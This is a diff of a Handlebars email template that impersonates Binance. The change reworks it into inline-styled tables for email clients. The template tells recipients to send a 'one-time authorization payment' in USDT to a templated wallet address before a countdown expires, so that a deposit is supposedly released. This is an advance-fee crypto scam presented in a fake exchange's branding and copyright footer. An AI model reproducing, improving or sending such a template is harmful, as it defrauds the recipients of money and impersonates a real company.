@@ -1,299 +1,133 @@
-<!-- email-templates/deposit-authorization.hbs -->
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Binance Deposit Authorization</title>
-  <style>
-    body {
-      background: #0c162d;
-      color: #e0e0e0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      padding: 0;
-      margin: 0;
-    }
-    .container {
-      max-width: 600px;
-      margin: 20px auto;
-      background: #1e293b;
-      border-radius: 16px;
-      overflow: hidden;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.4);
-      border: 1px solid #2d3a4e;
-    }
-    .header {
-      background: linear-gradient(90deg, #f0b90b 0%, #f8d12f 100%);
-      padding: 25px;
-      text-align: center;
-    }
-    .logo-container {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      gap: 12px;
-    }
-    .binance-logo {
-      font-size: 28px;
-      font-weight: 800;
-      color: #1e293b;
-      letter-spacing: 1px;
-    }
-    .usdt-badge {
-      background: #26a17b;
-      color: #fff;
-      padding: 6px 14px;
-      border-radius: 20px;
-      font-weight: bold;
-      font-size: 14px;
-    }
-    .title {
-      color: #1e293b;
-      font-size: 22px;
-      font-weight: 700;
-      margin-top: 15px;
-    }
-    .status-bar {
-      background: #2d3a4e;
-      padding: 14px 20px;
-      display: flex;
-      justify-content: space-between;
-      border-top: 1px solid #3c4b63;
-      border-bottom: 1px solid #3c4b63;
-      font-size: 14px;
-    }
-    .status-pending {
-      color: #f0b90b;
-      font-weight: 600;
-    }
-    .content {
-      padding: 25px 30px;
-    }
-    .card {
-      background: #2d3a4e;
-      border-radius: 12px;
-      padding: 20px;
-      border: 1px solid #3c4b63;
-      margin-bottom: 25px;
-    }
-    .card-title {
-      font-size: 18px;
-      font-weight: 600;
-      color: #f0b90b;
-      margin-bottom: 10px;
-    }
-    .amount {
-      font-size: 38px;
-      color: #f0b90b;
-      font-weight: bold;
-      text-align: center;
-      margin: 20px 0;
-    }
-    .info-box {
-      background: #3c4b63;
-      border-radius: 8px;
-      padding: 15px;
-      margin: 20px 0;
-    }
-    .info-row {
-      display: flex;
-      justify-content: space-between;
-      padding: 8px 0;
-      border-bottom: 1px solid #4a5b78;
-    }
-    .info-row:last-child {
-      border-bottom: none;
-    }
-    .label {
-      color: #a0aec0;
-    }
-    .value {
-      font-weight: bold;
-      color: #fff;
-      max-width: 65%;
-      word-break: break-word;
-      text-align: right;
-    }
-    .wallet-title {
-      color: #a0aec0;
-      font-weight: 500;
-      margin: 20px 0 8px;
-    }
-    .wallet-address {
-      background: #2d3a4e;
-      border: 1px solid #3c4b63;
-      border-radius: 8px;
-      padding: 14px;
-      font-family: monospace;
-      color: #fff;
-      word-break: break-word;
-    }
-    .timer {
-      background: rgba(240, 185, 11, 0.1);
-      border: 1px solid rgba(240, 185, 11, 0.3);
-      border-radius: 8px;
-      text-align: center;
-      padding: 12px;
-      margin-top: 20px;
-      font-size: 16px;
-    }
-    .time-left {
-      color: #f0b90b;
-      font-size: 22px;
-      margin-top: 6px;
-      font-weight: bold;
-    }
-    .steps {
-      margin-top: 30px;
-    }
-    .step {
-      display: flex;
-      gap: 12px;
-      margin-bottom: 20px;
-    }
-    .step-number {
-      background: #f0b90b;
-      color: #1e293b;
-      width: 28px;
-      height: 28px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-weight: 700;
-      flex-shrink: 0;
-    }
-    .step-content {
-      color: #e0e0e0;
-    }
-    .step-title {
-      color: #f0b90b;
-      font-weight: 600;
-      margin-bottom: 4px;
-    }
-    .login-reminder {
-      text-align: center;
-      background: rgba(59, 130, 246, 0.1);
-      padding: 15px;
-      border-radius: 8px;
-      margin-top: 30px;
-      border: 1px solid rgba(59, 130, 246, 0.3);
-      font-size: 14px;
-    }
-    .footer {
-      text-align: center;
-      padding: 20px;
-      font-size: 13px;
-      color: #a0aec0;
-      border-top: 1px solid #2d3a4e;
-    }
-    .footer-links {
-      margin-top: 12px;
-      display: flex;
-      justify-content: center;
-      gap: 16px;
-    }
-    .footer-links a {
-      color: #a0aec0;
-      text-decoration: none;
-    }
-    @media (max-width: 480px) {
-      .content {
-        padding: 20px;
-      }
-      .amount {
-        font-size: 32px;
-      }
-      .wallet-address {
-        font-size: 14px;
-      }
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <div class="header">
-      <div class="logo-container">
-        <div class="binance-logo">BINANCE</div>
-        <div class="usdt-badge">USDT</div>
-      </div>
-      <div class="title">Deposit Authorization Required</div>
-    </div>
+<html>
+  <head>
+    <title>Binance Deposit Authorization</title>
+    <meta charset="UTF-8" />
+  </head>
+  <body style="margin:0; padding:0; background-color:#f9fafb; font-family:Segoe UI, Tahoma, Geneva, Verdana, sans-serif; color:#1e293b;">
+    <table cellpadding="0" cellspacing="0" width="100%" style="background-color:#f9fafb;">
+      <tr>
+        <td align="center">
+          <!-- Main Container -->
+          <table cellpadding="0" cellspacing="0" width="600" style="background-color:#ffffff; border-radius:8px; overflow:hidden; border:1px solid #e5e7eb;">
+            <!-- Header -->
+            <tr>
+              <td style="background:#f0b90b; padding:30px 20px; text-align:center;">
+                <table cellpadding="0" cellspacing="0" align="center">
+                  <tr>
+                    <td style="font-size:28px; font-weight:bold; color:#1e293b;">BINANCE</td>
+                    <td style="background:#26a17b; color:#ffffff; padding:6px 14px; border-radius:20px; font-weight:bold; font-size:14px; margin-left:10px;">USDT</td>
+                  </tr>
+                </table>
+                <div style="margin-top:10px; font-size:20px; font-weight:600; color:#1e293b;">Deposit Authorization Required</div>
+              </td>
+            </tr>
 
-    <div class="status-bar">
-      <span class="status-pending">Payment Pending</span>
-      <span>Created: {{date}}</span>
-    </div>
+            <!-- Status Bar -->
+            <tr>
+              <td style="padding:14px 20px; background-color:#f3f4f6; border-top:1px solid #e5e7eb; border-bottom:1px solid #e5e7eb;">
+                <table width="100%">
+                  <tr>
+                    <td style="color:#d97706; font-weight:bold;">Payment Pending</td>
+                    <td align="right" style="font-size:14px;">Created: {{date}}</td>
+                  </tr>
+                </table>
+              </td>
+            </tr>
 
-    <div class="content">
-      <div class="card">
-        <div class="card-title">One-Time Authorization</div>
-        <p>To complete your deposit securely, send a verification payment to confirm account ownership.</p>
-        <div class="amount">{{amount}} USDT</div>
+            <!-- Content -->
+            <tr>
+              <td style="padding:30px;">
+                <table width="100%" cellpadding="0" cellspacing="0" style="margin-bottom:30px;">
+                  <tr>
+                    <td style="font-size:18px; font-weight:bold; color:#b45309; padding-bottom:8px;">One-Time Authorization</td>
+                  </tr>
+                  <tr>
+                    <td style="font-size:14px; padding-bottom:20px;">To verify ownership of your wallet, send a small authorization payment.</td>
+                  </tr>
+                  <tr>
+                    <td align="center" style="font-size:32px; font-weight:bold; color:#b45309; padding:10px 0;">{{amount}} USDT</td>
+                  </tr>
 
-        <div class="info-box">
-          <div class="info-row">
-            <span class="label">Network:</span>
-            <span class="value">{{network}}</span>
-          </div>
-          <div class="info-row">
-            <span class="label">Fee:</span>
-            <span class="value">{{fee}} USDT</span>
-          </div>
-          <div class="info-row">
-            <span class="label">Total to Receive:</span>
-            <span class="value">{{totalToReceive}} USDT</span>
-          </div>
-        </div>
+                  <!-- Info Box -->
+                  <tr>
+                    <td style="background:#f3f4f6; border:1px solid #e5e7eb; padding:15px; border-radius:6px;">
+                      <table width="100%">
+                        <tr>
+                          <td style="color:#6b7280;">Network:</td>
+                          <td align="right" style="font-weight:bold;">{{network}}</td>
+                        </tr>
+                        <tr>
+                          <td style="color:#6b7280;">Fee:</td>
+                          <td align="right" style="font-weight:bold;">{{fee}} USDT</td>
+                        </tr>
+                        <tr>
+                          <td style="color:#6b7280;">Total to Receive:</td>
+                          <td align="right" style="font-weight:bold;">{{totalToReceive}} USDT</td>
+                        </tr>
+                      </table>
+                    </td>
+                  </tr>
 
-        <div class="wallet-title">Send Payment To:</div>
-        <div class="wallet-address">{{walletAddress}}</div>
+                  <!-- Wallet -->
+                  <tr>
+                    <td style="padding-top:20px; font-size:14px; color:#6b7280;">Send Payment To:</td>
+                  </tr>
+                  <tr>
+                    <td style="padding:10px; border:1px solid #e5e7eb; background:#ffffff; font-family:monospace; font-size:15px;">{{walletAddress}}</td>
+                  </tr>
 
-        <div class="timer">
-          Complete payment within:
-          <div class="time-left">{{timeLeft}}</div>
-        </div>
-      </div>
+                  <!-- Timer -->
+                  <tr>
+                    <td style="background:#fef3c7; border:1px solid #fde68a; text-align:center; padding:14px; margin-top:20px; font-size:14px;">
+                      Complete payment within:
+                      <div style="font-size:22px; font-weight:bold; color:#b45309; margin-top:5px;">{{timeLeft}}</div>
+                    </td>
+                  </tr>
+                </table>
 
-      <div class="steps">
-        <div class="step">
-          <div class="step-number">1</div>
-          <div class="step-content">
-            <div class="step-title">Log in to Binance</div>
-            <p>Use the web or app version to begin the payment process.</p>
-          </div>
-        </div>
-        <div class="step">
-          <div class="step-number">2</div>
-          <div class="step-content">
-            <div class="step-title">Send Payment</div>
-            <p>Send exactly <strong>{{amount}} USDT</strong> to the wallet address using <strong>{{network}}</strong>.</p>
-          </div>
-        </div>
-        <div class="step">
-          <div class="step-number">3</div>
-          <div class="step-content">
-            <div class="step-title">Complete Authorization</div>
-            <p>Once confirmed, your deposit will be processed automatically within a few minutes.</p>
-          </div>
-        </div>
-      </div>
+                <!-- Steps -->
+                <table width="100%" cellpadding="0" cellspacing="0" style="margin-bottom:20px;">
+                  <tr>
+                    <td style="font-weight:bold; color:#b45309;">Step 1:</td>
+                    <td style="padding-left:10px;">Log in to your Binance account via web or app.</td>
+                  </tr>
+                  <tr>
+                    <td style="font-weight:bold; color:#b45309;">Step 2:</td>
+                    <td style="padding-left:10px;">Send exactly <strong>{{amount}} USDT</strong> to the address using <strong>{{network}}</strong>.</td>
+                  </tr>
+                  <tr>
+                    <td style="font-weight:bold; color:#b45309;">Step 3:</td>
+                    <td style="padding-left:10px;">Once confirmed, your deposit will be processed automatically.</td>
+                  </tr>
+                </table>
 
-      <div class="login-reminder">
-        <strong>Reminder:</strong> Make sure you are logged in to your Binance account when sending the payment.
-      </div>
-    </div>
+                <!-- Reminder -->
+                <table width="100%" style="background:#e0f2fe; border:1px solid #bae6fd; padding:14px; text-align:center; border-radius:6px;">
+                  <tr>
+                    <td><strong>Reminder:</strong> Ensure you're logged into your Binance account before sending payment.</td>
+                  </tr>
+                </table>
+              </td>
+            </tr>
 
-    <div class="footer">
-      <p>This is an automated message. Do not reply.</p>
-      <p>Need help? Visit our Support Center.</p>
-      <div class="footer-links">
-        <a href="#">Binance.com</a>
-        <a href="#">Support</a>
-        <a href="#">Security Tips</a>
-      </div>
-      <p style="margin-top: 15px;">© 2025 Binance. All rights reserved.</p>
-    </div>
-  </div>
-</body>
+            <!-- Footer -->
+            <tr>
+              <td style="padding:20px; font-size:12px; text-align:center; color:#6b7280; border-top:1px solid #e5e7eb;">
+                <p>This is an automated message. Do not reply.</p>
+                <p>Need help? Visit our Support Center.</p>
+                <p>
+                  <a href="#" style="color:#6b7280; text-decoration:none;">Binance.com</a> |
+                  <a href="#" style="color:#6b7280; text-decoration:none;">Support</a> |
+                  <a href="#" style="color:#6b7280; text-decoration:none;">Security Tips</a>
+                </p>
+                <p style="margin-top:15px;">© 2025 Binance. All rights reserved.</p>
+              </td>
+            </tr>
+
+          </table>
+        </td>
+      </tr>
+    </table>
+  </body>
 </html>
